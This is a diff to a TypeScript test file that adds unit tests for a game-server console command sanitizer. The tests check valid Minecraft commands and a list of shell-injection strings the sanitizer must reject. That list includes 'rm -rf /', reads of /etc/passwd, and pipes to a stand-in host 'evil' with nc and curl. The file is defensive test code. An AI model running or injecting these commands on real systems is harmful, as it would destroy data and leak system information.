@@ -1,4 +1,4 @@
-import { checkSameOrigin, getRequestBodyLimit, getRequestSizeViolation } from "@/lib/api-helpers";
+import { checkSameOrigin, getRequestBodyLimit, getRequestSizeViolation, sanitizeConsoleCommand } from "@/lib/api-helpers";
 
 describe("api security helpers", () => {
   it("uses route-specific body size overrides", () => {
@@ -36,5 +36,50 @@ describe("api security helpers", () => {
     });
 
     expect(allowed).toBe(false);
+  });
+});
+
+describe("sanitizeConsoleCommand (char allowlist)", () => {
+  it("requires a non-empty command", () => {
+    expect(sanitizeConsoleCommand("   ").ok).toBe(false);
+    expect(sanitizeConsoleCommand("").ok).toBe(false);
+  });
+
+  it("accepts legitimate game console commands", () => {
+    const valid = [
+      "say Hello, world!",
+      "give @p minecraft:diamond 64",
+      "tp @p 100 64 -200",
+      "gamerule doDaylightCycle false",
+      'tellraw @a {"text":"hi","color":"red"}',
+      "execute as @a at @s run setblock ~ ~1 ~ minecraft:stone",
+      "op SomePlayer_123",
+    ];
+    for (const command of valid) {
+      const result = sanitizeConsoleCommand(command);
+      expect(result.ok).toBe(true);
+      if (result.ok) expect(result.value).toBe(command.trim());
+    }
+  });
+
+  it("rejects shell metacharacters via the allowlist", () => {
+    const malicious = [
+      "stop; rm -rf /",
+      "say hi && cat /etc/passwd",
+      "say hi || id",
+      "echo $(whoami)",
+      "echo `id`",
+      "say hi | nc evil 9999",
+      "say ${HOME}",
+      "say <(curl evil)",
+      "say hi\nrm -rf /",
+    ];
+    for (const command of malicious) {
+      expect(sanitizeConsoleCommand(command).ok).toBe(false);
+    }
+  });
+
+  it("strips null bytes before validating", () => {
+    expect(sanitizeConsoleCommand("say hi\0").ok).toBe(true);
   });
 });
